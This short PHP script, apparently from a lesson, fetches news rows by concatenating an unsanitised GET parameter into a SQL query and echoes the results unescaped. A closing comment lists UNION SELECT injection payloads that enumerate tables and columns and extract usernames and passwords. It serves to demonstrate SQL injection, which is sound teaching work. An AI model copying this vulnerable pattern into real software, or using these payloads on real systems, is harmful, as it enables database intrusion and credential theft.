<?php

    mysql_connect("127.0.0.1", "root", "");
    mysql_select_db("aula01");

    $id = $_GET["id"];

    $sql = "SELECT * FROM noticias
    WHERE id=" . $id . "
    ";
    $retorno = mysql_query($sql);

    while($linha = mysql_fetch_assoc($retorno)) {
        echo "<h1>" . $linha["titulo"] . "</h1>" .
            "<p>" . $linha["texto"] . "</p>";
    }

    /*
    UNION SELECT 1, 2, 3
    UNION SELECT 1, CONCAT(table_name), 3 FROM information_schema.tables
    UNION SELECT 1, CONCAT(column_name), 3 FROM information_schema.columns
    UNION SELECT 1, CONCAT(usuario, ';', senha), 3 FROM usuario

    */
?>